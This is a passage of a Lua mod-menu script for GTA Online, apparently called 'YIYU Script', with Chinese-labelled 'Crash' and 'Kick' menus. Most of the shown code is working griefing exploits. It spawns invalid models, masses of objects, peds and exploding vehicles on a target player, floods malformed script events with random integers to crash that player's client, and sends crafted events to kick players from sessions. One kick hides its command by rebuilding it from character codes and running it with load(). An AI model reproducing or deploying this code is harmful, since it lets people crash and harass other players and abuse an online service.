    local Object_jb1 = CreateObject(0xD75E01A6, TargetPlayerPos)
    local Object_jb2 = CreateObject(0x675D244E, TargetPlayerPos)
    local Object_jb3 = CreateObject(0x799B48CA, TargetPlayerPos)
    local Object_jb4 = CreateObject(0x68E49D4D, TargetPlayerPos)
    local Object_jb5 = CreateObject(0x66F34017, TargetPlayerPos)
    local Object_jb6 = CreateObject(0xDE1807BB, TargetPlayerPos)
    local Object_jb7 = CreateObject(0xC4C9551E, TargetPlayerPos)
    local Object_jb8 = CreateObject(0xCF37BA1F, TargetPlayerPos)
    local Object_jb9 = CreateObject(0xB69AD9F8, TargetPlayerPos)
    local Object_jb10 = CreateObject(0x5D750529, TargetPlayerPos)
    local Object_jb11 = CreateObject(0x1705D85C, TargetPlayerPos)
    for i = 0, 1000 do 
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb5, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb6, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb7, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb8, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb9, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb10, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb11 ,TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        util.yield(10)
    end
    util.yield(5500)
    entities.delete_by_handle(Object_jb1)
    entities.delete_by_handle(Object_jb2)
    entities.delete_by_handle(Object_jb3)
    entities.delete_by_handle(Object_jb4)
    entities.delete_by_handle(Object_jb5)
    entities.delete_by_handle(Object_jb6)
    entities.delete_by_handle(Object_jb7)
    entities.delete_by_handle(Object_jb8)
    entities.delete_by_handle(Object_jb9)
    entities.delete_by_handle(Object_jb10)
    entities.delete_by_handle(Object_jb11)
end)


  menu.toggle_loop(Crash, "懂哥崩溃", {""}, "", function()
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
        util.yield(20)
        local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
        TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
        util.yield(400)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
        util.yield(800)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
     end)


     menu.action(Crash, "iz5mc杀妈崩溃", {""}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 150 do
            util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        end
        util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
        end
        menu.trigger_commands("givesh " .. players.get_name(pid))
        util.yield(100)
        util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
    end)
    menu.action(Crash, "马桶崩溃", {""}, "", function()
        for i = 1, 10 do
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local cord = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            STREAMING.REQUEST_MODEL(-930879665)
            util.yield(10)
            STREAMING.REQUEST_MODEL(3613262246)
            util.yield(10)
            STREAMING.REQUEST_MODEL(452618762)
            util.yield(10)
            while not STREAMING.HAS_MODEL_LOADED(-930879665) do util.yield() end
            while not STREAMING.HAS_MODEL_LOADED(3613262246) do util.yield() end
            while not STREAMING.HAS_MODEL_LOADED(452618762) do util.yield() end
            local a1 = entities.create_object(-930879665, cord)
            util.yield(10)
            local a2 = entities.create_object(3613262246, cord)
            util.yield(10)
            local b1 = entities.create_object(452618762, cord)
            util.yield(10)
            local b2 = entities.create_object(3613262246, cord)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(452618762)
            util.yield(10)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3613262246)
            util.yield(10)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-930879665)
            util.yield(10)
            end
            if SE_Notifications then
                notification("Finished.",colors.red)
            end
        end)
        menu.toggle_loop(Crash, "循环碎片崩溃", {""}, "", function()
                local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                util.yield(350)
                entities.delete_by_handle(object)
            end) 
         menu.toggle_loop(Crash, "循环0x崩溃", {""}, "", function()
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        
        local PED1 = CreatePed(26,util.joaat("cs_beverly"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED1, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED1,-270015777,80,true,true)
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)   
        util.yield(800)
        entities.delete_by_handle(PED1)
    end)    



      menu.action(Crash, "饼饼牛子崩溃", {""}, "无效外观", function()
      menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
        local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        for i = 0, 500 do
            PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
			ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false, true);
            util.yield(10)
        end
        entities.delete_by_handle(Spawned_Mike)
        menu.trigger_commands("anticrashcam off")
    end)

      menu.action(Crash, "美杜莎崩溃", {""}, "", function()
        menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local plauuepos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        plauuepos.x = plauuepos.x + 5
        plauuepos.z = plauuepos.z + 5
        local hunter = {}
        for i = 1 ,3 do
            for n = 0,120 do
                hunter[n] = CreateVehicle(1077420264,plauuepos,0)
                util.yield(0)
                ENTITY.FREEZE_ENTITY_POSITION(hunter[n],true)
                util.yield(0)
                VEHICLE.EXPLODE_VEHICLE(hunter[n], true, true)
            end
            util.yield(190)
            for i = 1,#hunter do
                if hunter[i] ~= nil then
                    entities.delete_by_handle(hunter[i])
                end
            end
        end
        notification("崩溃完成", colors.black)
        menu.trigger_commands("anticrashcam off")
        hunter = nil
        plauuepos = nil	
    end)  

    menu.action(Crash, "NPC崩溃", {""}, "", function()
        menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnPed_Wade = { }
    for i = 1, 60 do
        SpawnPed_Wade[i] = CreatePed(26, util.joaat("PLAYER_ONE"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        util.yield(1)
    end
    util.yield(5000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnPed_Wade[i])
        menu.trigger_commands("anticrashcam off")
    end
	end)
 


    menu.action(Crash, "无效模型崩溃", {""}, "", function()
        menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
        local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
        local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
        local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
        for i = 0, 100 do 
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(Object_pizza1)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza3)
        entities.delete_by_handle(Object_pizza4)
        menu.trigger_commands("anticrashcam off")
        end)


menu.click_slider(Crash, "噪音崩溃" , {}, "",1, 2, 1, 1, function(on_change)
	if on_change == 1 then
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', true, 10000, false)
            end
            util.yield()
        end
	end
	if on_change == 2 then
	    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 1000
        while time > util.current_time_millis() do
        local pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        for i = 1, 20 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Object_Dropped_Remote', pos.x,pos.y,pos.z, 'GTAO_FM_Events_Soundset', true, 10000, false)
        end
        util.yield()
		end
    end
	end)

    menu.action(Crash, "鬼崩", {""}, "", function()
        menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        local Spawned_tr3 = CreateVehicle(util.joaat("tr3"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_tr3, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(Spawned_tr3, false, 0)
        local Spawned_chernobog = CreateVehicle(util.joaat("chernobog"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_chernobog, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(Spawned_chernobog, false, 0)
        local Spawned_avenger = CreateVehicle(util.joaat("avenger"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_avenger, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(Spawned_avenger, false, 0)
        for i = 0, 100 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false)
            util.yield(10 * math.random())
            ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, true, false, false)
            util.yield(10 * math.random())
        end
        menu.trigger_commands("anticrashcam off")
    end)

    Kick= menu.list(PlayerMainMenu, "踢出", {}, "", function(); end)


menu.action(Kick, "脚本事件踢", {""}, "", function()
    util.trigger_script_event(1 << pid, {111242367, pid, -210634234})
end)

menu.action(Kick, "网络保释踢", {""}, "", function()
    util.trigger_script_event(1 << pid, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE))})
end)

menu.action(Kick, "无效掉落物踢", {""}, "", function()
    util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x4, -1, 1, 1, 1})
end)

    menu.action(Kick, "暴龙飞踢", {""}, "", function()
        if pid == players.user() then 
            util.toast('不能踢自己，sb')
            return 
        end
        if pid == players.get_host() then 
            util.toast('不能踢主机，sb')
            return
        end

        local cur_crash_meth = ""
        local cur_crash = ""
        for a,b in pairs(crash_tbl_2) do
            cur_crash = ""
            for c,d in pairs(b) do
                cur_crash = cur_crash .. string.sub(crash_tbl[a], d, d)
            end
            cur_crash_meth = cur_crash_meth .. cur_crash
        end
        local crash_keys = {"NULL", "VOID", "NaN", "127563/0", "NIL"}
        local crash_table = {109, 101, 110, 117, 046, 116, 114, 105, 103, 103, 101, 114, 095, 099, 111, 109, 109, 097, 110, 100, 115, 040}
        local crash_str = ""
        for k,v in pairs(crash_table) do
            crash_str = crash_str .. string.char(crash_table[k])
        end
        for k,v in pairs(crash_keys) do
            print(k + (k*128))
        end
        c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        request_model_load(kitteh_hash)
        local kitteh = entities.create_ped(28, kitteh_hash, c, math.random(0, 270))
        AUDIO.PLAY_PAIN(kitteh, 7, 0)
        menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(players.user()))
        cwash_in_progwess()
        util.yield(500)
        for i=1, math.random(10000, 12000) do
        end
        local crash_compiled_func = load(crash_str .. '\"' .. cur_crash_meth .. PLAYER.GET_PLAYER_NAME(pid) .. '\")')
        pcall(crash_compiled_func)
        util.toast('再你妈的见')
    end)
end 


cur_names = {}
players.on_join(function(pid)
    set_up_player_actions(pid)
end)
players.dispatch_on_join()

util.keep_running()




    

util.on_stop(function()
    util.show_corner_help("~b~已关闭".. SCRIPT_FILENAME .."\n~s~感谢使用 ~w~^ ^")
    notification("感谢使用YIYU Script :D", colors.black)

end)	

